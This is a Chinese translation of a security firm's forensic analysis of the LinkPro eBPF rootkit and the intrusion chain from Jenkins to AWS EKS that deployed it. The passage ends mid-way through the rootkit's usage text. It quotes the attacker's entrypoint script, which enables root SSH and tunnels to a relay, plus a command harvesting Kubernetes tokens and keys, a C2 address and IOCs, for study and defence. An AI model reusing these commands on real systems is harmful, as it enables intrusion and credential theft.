---
title: LinkPro eBPF rootkit 深度剖析
url: https://mp.weixin.qq.com/s/CTMTdsW49ERUffTN-Dvj4w
source: Doonsec's feed
date: 2026-05-05
fetch_date: 2026-05-06T05:07:29.809622
---

# LinkPro eBPF rootkit 深度剖析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/h4gtbB74nShcNyandcFb3W9mOqa2S1qQr1nynA65I3ee4WM3O4A4J0Lw80d7K6B9HgnG8RmrEt7zRVLmKHp7UB3fyWwE8CgPLJ2ia7ItQooA/0?wx_fmt=jpeg)

# LinkPro eBPF rootkit 深度剖析

Théo Letailleur
Théo Letailleur

securitainment

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

| 链接 | 说明 |
| --- | --- |
| https://www.synacktiv.com/en/publications/linkpro-ebpf-rootkit-analysis | Théo Letailleur |

在一次针对 AWS 托管基础设施被入侵事件的数字取证调查中,我们发现了一个针对 GNU/Linux 系统的隐蔽后门。该后门依赖于两个 eBPF 模块来实现其功能:一方面用于隐藏自身,另一方面则用于在收到"魔法数据包"时被远程激活。本文将详细介绍该 rootkit 的能力,并展示在本案中观察到的感染链——攻击者借助该感染链将其植入到了 AWS EKS 环境中的多个节点上。

## 引言

eBPF ( extended Berkeley Packet Filter ) 是 Linux 中被广泛采用的一项技术,因其用例丰富 ( 可观测性、安全、网络等 ) ,并且能够在内核上下文中运行的同时由用户态进行编排。威胁组织正越来越多地滥用这项技术来构建复杂的后门,从而绕过传统的系统监控工具。

诸如 BPFDoor1、Symbiote2 以及 J-magic3 等恶意软件,都展示了 eBPF 在构建被动式后门方面的有效性——它们能够监听网络流量,并在收到特定的"魔法数据包"时被激活。此外,还有一些更复杂的开源工具,例如 ebpfkit4 ( 概念验证 ) 和 eBPFexPLOIT5 ,它们的编排器由 Golang 开发,具备 rootkit 的能力,所提供的功能涵盖建立隐蔽的命令与控制 ( C2 ) 通道、进程隐藏以及容器逃逸等技术。

在最近一次针对受入侵 AWS 托管基础设施的调查中,Synacktiv CSIRT 还原出了一条较为复杂的感染链,该感染链最终在 GNU/Linux 系统上植入了一个隐蔽后门。该后门依赖于两个 eBPF 模块的安装:一个用于隐藏自身,另一个用于在收到"魔法数据包"后被远程激活。

## 感染链

取证分析将一台暴露在互联网上的、存在漏洞的 Jenkins 服务器 ( CVE-2024-238976 ) 确定为本次入侵的源头。该服务器作为攻击者的初始入口,使其得以横向进入托管在 Amazon EKS7⁣ - Elastic Kubernetes Service ( 标准模式 ) 的多个集群中的集成与部署流水线。

借助这台 Jenkins 服务器,攻击者向多个 Kubernetes 集群部署了一个名为 `kvlnt/vv`的恶意 docker 镜像 ( 该镜像曾托管在 hub.docker.com 上,在我们注意到它之后,镜像已被官方下架 ) 。该 docker 镜像基于 Kali Linux,并在其之上叠加了两个额外的 layer。

![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nShZpQISYibYic4hibXJWRQ5HoH67HLw3y0Lq8tfzQegbAsShHZCP9ZPlG8T5tujYbibhVbl6vYJWwsO2QnLtgtmonU1FiaNXAicWWAsY/640?wx_fmt=png&from=appmsg)

Docker image layers

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiaEAP8ZWn1tKicmjG2m3E4896Hic8GKfJz28Cd70tHDicbBkWRnHu0LKEkqUuVFOjyGvqubvnPwXgyya6skOjia1FQ07bDEjriayYiaQ/640?wx_fmt=png&from=appmsg)

Docker image tree

这两个 layer 将 `app`文件夹设为工作目录,并向其中加入了三个文件:

1. `/app/start.sh`

   : 一个 **bash**脚本,作为 docker 镜像的入口点 ( entrypoint ) 。其作用是启动 *ssh*服务,执行 `/app/app`后门以及 `/app/link`程序。

   ```
   #!/bin/bash
   sed -i -e 's/#PermitRootLogin /PermitRootLogin yes\n#/g' /etc/ssh/sshd_config
   /etc/init.d/ssh start
   ./app &
   ./link -k ooonnn -w mmm000 -W -o 0.0.0.0/0 || tail -f /var/log/wtmp
   ```
2. `/app/link`

   : 一个名为 **vnt**8 的开源程序,扮演 **VPN**服务器并提供代理能力。它会连接到位于 `vnt.wherewego.top:29872`的社区中继服务器。这使得攻击者能够通过任意 IP 地址连入受害服务器,并以其作为代理来访问基础设施中的其他服务器。在 `/app/start.sh`脚本中指定的命令行参数如下:

1. `-k ooonnn`

   : 用于在中继服务器上标识虚拟 VLAN 的 token
2. `-w mmm000`

   : 用于在客户端之间加密通信的密码 ( AES128-GCM )
3. `-W`

   : 启用客户端与服务器之间的加密 ( RSA+AES256-GCM ) ,以防止 token 泄露和 *中间人*攻击。
4. `-o 0.0.0.0/0`

   : 允许向所有网段进行 *转发*。

3. `/app/app`

   : 一个 *下载器*恶意软件,从 S3 桶中获取一份加密的恶意载荷。其访问的 URL 为 `https[:]//fixupcount.s3.dualstack.ap-northeast-1.amazonaws[.]com/wehn/rich.png`。在本次观察到的案例中,该载荷是一份内存中运行的 **vShell 4.9.3**,通过 WebSocket 与其命令控制服务器 ( `56.155.98.37`) 通信。Synacktiv CSIRT 将该 *下载器*命名为 **vGet**,因为在本案中它与 **vShell**存在直接关联。

**vShell**是一款已被记录的后门9,尤其被 UNC517410 使用。其源代码已大约一年没有出现在 GitHub 上。然而,一个较新的版本 4.9.3 及其 ( 已被破解的 ) 许可证仍可被下载,使得各种攻击者都得以使用 vShell。

至于 **vGet**,目前并没有任何开源公开材料,该程序由 Rust 开发并经过 strip 处理。这段恶意代码在执行开始时会先创建一个从 `/tmp/.del`指向 `/dev/null`的符号链接,然后再下载 **vShell**载荷。**vShell**在执行时,如果操作员请求打开终端,则会初始化环境变量 `HISTFILE=/tmp/.del`。其目的在于确保命令历史不会被写入文件 ( 例如 `.bash_history`) 。因此,这两个程序之间很可能存在关联,**vGet**也很可能是专门为在内存中直接执行 **vShell**而开发的,以避免在磁盘上留下痕迹。

![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSiamfjLiavHJ6EqWRFfY4QatnyZdDiaYzfmE6rfV4iagtPxT0gXDib3cxwBXoiaMgbFt0tFQ6N2cRTG4s035B5VKfZBOLmVRIfRic8sLQ/640?wx_fmt=png&from=appmsg)

从

`/dev/null`到 `/tmp/.del`的符号链接

*所恢复的 **vGet**样本符号信息很少,仅在 Rust 依赖的绝对路径中出现了对用户名 **cosmanking**的引用,例如:*

* *`/Users/cosmanking/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/ureq-2.12.1/src/request.rs.`*

至于该 docker 镜像,其配置了如下的挂载点:

* 挂载点: `/mnt`
* 源 ( 宿主机 ) : `/`
* 目的 ( 容器内 ) : `/mnt`
* 访问权限: 读和写
* 类型: bind

这种配置使攻击者得以从容器 ( 正在运行的镜像 ) 上下文中逃逸,并以 **root**权限访问根分区上的整个文件系统。

通过 `kvlnt/vv`pod 内的 `/app/app`( **vGet**) 进程,攻击者执行了一条 `cat`命令,以期获取宿主机以及其他 pod 中可用的凭据 ( 认证 token、API key、证书等 ) 。下面是该命令的简短摘录:

```
cat \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~csi/pvc-[UUID]/mount \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~csi/pvc-[UUID]/vol_data.json \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~projected/kube-api-access-[ID]/ca.crt \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~projected/kube-api-access-[ID]/namespace \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~projected/kube-api-access-hfsns/token \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~secret/webhook-cert/ca \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~secret/webhook-cert/cert \
var/lib/kubelet/pods/[..POD UUID..]/volumes/kubernetes.io~secret/webhook-cert/key
[..ETC..]
```

在该 docker 镜像被部署数周之后,我们在多个 Kubernetes 节点以及生产服务器上观察到了 **另外两款恶意软件**的执行。后者尤其因 **经济目的**而成为攻击团伙的重点目标。

第一段恶意代码是一个 **dropper**,它内嵌了另一份在内存中执行的 **vShell**后门 ( v4.9.3 ) ,这一次通过 **DNS 隧道**进行通信。该 *dropper*与 SNOWLIGHT11 并不相似 ( SNOWLIGHT 此前在一些公开材料中被观察到用于投放 **vShell**) ,但目的相同。其解密过程分为两步。下面是 Synacktiv CSIRT 所分析样本的一段摘录:

![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSgspstGB6xgU0TUIvib93g6brfYWS9ibGicXsgKnTtrJzk3gbt9ricj3Ewxc65o5vdU3NNLauJSgTbaXfUzVcG2pqOdj1vhQcxCjSQ/640?wx_fmt=png&from=appmsg)

Decrypt shellcode

第 1 步: 第一段 shellcode 解密后被直接执行

![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSiag0n1UAv0NDZ1iaTibibgHEWwvnSPPR9LJOKp55DibPwzIx1C98iceT4CZspqFDQZmr4deribthfia8RuSpNPLALlADOcAaSNWs3qB70/640?wx_fmt=png&from=appmsg)

Shellcode self decrypt

第 2 步: 这段 shellcode 解密并把内嵌的 ELF **vShell**后门加载到自身内存中

最后的载荷此前并无公开记录,Synacktiv CSIRT 将其命名为 **LinkPro**。它是一款利用 eBPF 技术的后门,凭借其隐蔽性、持久化能力以及内网横向跳板能力,可以被称为一款 rootkit。

## LinkPro Rootkit

**LinkPro**针对 GNU/Linux 系统,由 Golang 开发。Synacktiv CSIRT 之所以将其命名为 **LinkPro**,是参照其主模块所定义的符号: `github.com/link-pro/link-client`。GitHub 账号 link-pro 既无公开仓库,也无任何贡献。**LinkPro**利用 eBPF 技术,只在收到"魔法数据包"时才会被激活,并借此在受害系统上隐藏自身。

| SHA256 | `d5b2202b7308b25bda8e106552dafb8b6e739ca62287ee33ec77abe4016e698b`( 被动后门 )

| `1368f3a8a8254feea14af7dc928af6847cab8fcceec4f21e0166843a75e81964` ( 主动后门 ) |  |
| --- | --- |
| 文件类型 | ELF 64-bit LSB executable, x86-64, executable/linux/elf64 |
| 文件大小 | 8710464 bytes |
| 威胁 | Linux Rootkit |
| 观察到的文件名 | `.tmp~data.ok` ; `.tmp~data.pro`; `.tmp~data.resolveld` |

**LinkPro**内嵌了四个 ELF 模块: 一个共享库、一个内核模块以及两个 eBPF 模块:

![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSjKz9r6upU0gQcGe0o8vqwAL3SfgibbBO5PFFick09B9iakzfWlfPmE6XWibEfseZLnxGAUTribrMppsgcUYXPsibGEkgLykR1WUMPSc/640?wx_fmt=png&from=appmsg)

内嵌的 ELF 程序 ( Malcat 视图 )

下面将逐一介绍这些 ELF 模块。不过,**LinkPro**从未使用过其中的内核模块 ( 程序中并未实现加载该模块的函数 ) 。

| SHA256 | 类型 | 大小 |
| --- | --- | --- |
| `b11a1aa2809708101b0e2067bd40549fac4880522f7086eb15b71bfb322ff5e7` | Shared object | 14.2 KiB |
| `9fc55dd37ec38990bb27ea2bc18dff0bb2d16ad7aa562ab35a6b63453c397075` | Kernel object | 573.0 KiB |
| `364c680f0cab651bb119aa1cd82fefda9384853b1e8f467bcad91c9bdef097d3` | BPF | 18.8 KiB |
| `b8c8f9888a8764df73442ea78393fe12464e160d840c0e7e573f5d9ea226e164` | BPF | 35.4 KiB |

### 配置与通信

根据所定义的配置,**LinkPro**可以以两种方式运行: 被动模式或主动模式。其配置通过两种不同的方式获取:

1. 一种是以 JSON 结构内嵌在二进制文件中,并以关键字 `CFG0`作为前缀;
2. 另一种则是把默认参数直接 *硬编码*进 main 函数中。在两份样本中,我们都观察到了后者。

最后,程序在运行时还会读取命令行参数,用于覆盖默认值:

```
Usage of <program name>:
-addsvc
/ systemd disguise
-connection-mode string
: forward  reverse (default"reverse")
-debug string
         (default"false")
-dns-domain string
DNS (default"dns.example.com")
-dns-mode string
DNS: direct()  tunnel() (default"tunnel")
-dns-server string
DNS (:8.8.8.8:53)
-ebpf string
         eBPF  (0=,1=) (default"1")
-hideebpf string
        hide ebpf prog/map/link in /proc (0=,1=) (default"1")
-jitter string
        () (default"2")
-key string
        ()
-pid string
        pid to hide (default"-1")
-port string
         (default"6666")
-protocol string
        (httptcpudpdns) (default"http")
-reverse-port string
HTTP (default"2233")
-rmsvc
         systemd disguise
-server string
         (default"1.1.1.1")
-sleep string
        () (default"10...